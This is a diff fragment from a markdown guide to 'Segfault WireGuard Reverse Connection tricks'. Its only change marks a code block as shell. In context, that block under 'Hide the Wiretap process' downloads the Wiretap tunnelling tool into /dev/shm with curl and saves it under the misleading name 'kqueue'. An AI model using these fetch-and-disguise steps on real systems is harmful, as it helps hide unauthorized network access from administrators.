@@ -18,7 +18,7 @@ description: Segfault WireGuard Reverse Connection tricks.
 
 ## Hide the Wiretap process
 
-```
+```shell
 cd /dev/shm
 curl -fsSL https://github.com/sandialabs/wiretap/releases/download/v0.2.1/wiretap_0.2.1_linux_amd64.tar.gz | tar xfz - -O >kqueue
 PATH=.:$PATH
